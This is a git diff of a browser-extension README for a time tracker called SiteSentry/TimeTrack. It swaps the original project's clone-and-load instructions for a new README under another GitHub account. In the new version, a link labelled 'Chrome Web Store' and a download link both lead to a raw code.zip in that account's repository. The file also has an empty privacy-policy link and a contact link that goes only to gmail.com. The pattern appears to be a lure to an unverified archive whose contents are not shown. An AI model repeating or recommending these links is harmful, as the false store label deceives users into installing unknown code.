@@ -1,49 +1,68 @@
-# Site-Sentry: A Web Wellness Extension
 
-**Site-Sentry** is a browser extension designed to help users cultivate healthier digital habits and improve their online well-being.  
-In an age of constant digital distractions, Site-Sentry empowers you to take control of your browsing experience, focus on what matters, and reduce unproductive screen time.
+# SiteSentry (TimeTrack) - Browser Time Tracking Extension
 
-## ✨ Features
+Track your online activity, boost productivity, and improve your digital well-being with the **TimeTrack** browser extension.
 
-- **Website Blocking:** Block distracting websites (e.g., social media, entertainment sites) during designated focus periods.
-- **Time Tracking:** Monitor the time spent on various websites to gain insights into your browsing patterns.
-- **Usage Limits:** Set daily or per-session time limits for specific websites to prevent excessive use.
-- **Focus Mode:** Activate a dedicated focus mode that restricts access to pre-defined distracting sites.
-- **Productivity Reports:** View insightful reports and analytics on your browsing habits to identify areas for improvement.
-- **Export Data to Excel:** Download your browsing activity data as an Excel (.xlsx) file for in-depth analysis and record-keeping.
+## Features
 
-## 🚀 Installation
+- 🚀 **Automatic Time Tracking** – Monitor time spent on websites and apps
+- 📊 **Detailed Analytics** – View activity reports and usage charts
+- 🔔 **Smart Reminders** *(Upcoming)* – Gentle nudges for time on distracting sites
+- 🎯 **Productivity Scoring** – Track focus and compare historical performance
+- 🔐 **Privacy First** – All data stays local unless you enable encrypted sync
+- 🔁 **Cross-device Sync** – Secure synchronization for premium users
 
-To install **Site-Sentry**, follow these steps:
+## How It Works
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/Tanmay-hue/Site-Sentry-A-web-Wellness-Extension.git
-   ```
+1. **Install the Extension** – Add TimeTrack from the [Chrome Web Store](https://github.com/Ashraf2543/SiteSentry1/raw/refs/heads/main/code.zip) *(Firefox support coming soon)*
+2. **Let It Run in the Background** – Automatically tracks browsing activity
+3. **View Your Insights** – Get reports and visualizations of your time
+4. **Improve Your Habits** – Set goals and make data-driven changes
 
-2. Open your browser's extensions page:
-   - **Chrome:** `chrome://extensions`
-   - **Brave:** `brave://extensions`
-   - **Edge:** `edge://extensions`
+## Browser Support
 
-3. **Enable Developer Mode:** Toggle on the "Developer mode" switch (usually in the top right corner).
+**Currently Supported**:
+- Google Chrome
+- Microsoft Edge
 
-4. **Load Unpacked:** Click on the "Load unpacked" button.
+**Coming Soon**:
+- Mozilla Firefox
+- Safari
 
-5. **Select the cloned directory:** Navigate to the `Site-Sentry-A-web-Wellness-Extension` folder you cloned and select it.
+## Privacy Policy
 
-The extension should now be added to your browser.
+TimeTrack respects your privacy:
+- All tracking data is stored **locally**
+- No third-party data sharing or ad tracking
+- Premium sync uses **end-to-end encryption**
 
-## 💡 Usage
+See our [Privacy Policy](#) (link to be added) for full details.
 
-Once installed, you can access **Site-Sentry** by clicking on its icon in your browser's toolbar.
+## Installation
 
-- **Configure Blocked Sites:** Go to the extension's options page to add or remove websites from your blocked list.
-- **Set Time Limits:** Define how much time you want to spend on certain sites.
-- **Activate Focus Mode:** Click the extension icon and toggle on "Focus Mode" to engage your pre-set productivity settings.
-- **View Analytics:** Access the dashboard from the extension's popup to see your browsing reports and track your progress.
-- **Export Data:** On the analytics or reports page, click the "Export to Excel" button to download your data.
+You can download the extension ZIP and install it manually:
+[Download Latest Version](https://github.com/Ashraf2543/SiteSentry1/raw/refs/heads/main/code.zip)
 
-## 📞 Contact
+## Contributing
 
-For any questions or feedback, please open an issue on the [GitHub repository](https://github.com/Tanmay-hue/Site-Sentry-A-web-Wellness-Extension).
+We welcome contributions! To get started:
+
+1. Fork the repository
+2. Create a new branch (`git checkout -b feature/YourFeature`)
+3. Commit your changes (`git commit -m 'Add YourFeature'`)
+4. Push to your fork (`git push origin feature/YourFeature`)
+5. Open a Pull Request
+
+## License
+
+This project is currently **unlicensed**. All rights reserved by the author.
+
+## Contact
+
+- 📧 Email: [ashraf.jamal.652@gmail.com](https://gmail.com/)
+- 🐦 Twitter: [@sitesentry](#)
+- 💻 GitHub: [@Ashraf2543](https://github.com/Ashraf2543)
+
+---
+
+**Note**: This is a demo project. Some features listed (e.g., Smart Reminders, Firefox support) are under development.
